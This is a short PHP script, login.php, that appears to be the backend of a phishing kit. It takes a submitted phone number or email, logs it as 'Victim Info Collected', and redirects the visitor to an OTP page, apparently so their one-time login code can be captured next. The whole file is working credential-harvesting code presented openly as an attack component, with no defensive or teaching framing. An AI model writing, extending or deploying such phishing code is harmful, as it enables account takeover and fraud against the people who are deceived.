<?php
// login.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture phone/email from the form submission
    $phone_email = $_POST['phone_email'];

    // Log the collected information to the terminal
    error_log("Victim Info Collected: Phone/Email: " . $phone_email);

    // Redirect to OTP page after capturing the input
    header("Location: otp.html");
    exit();
}
?>
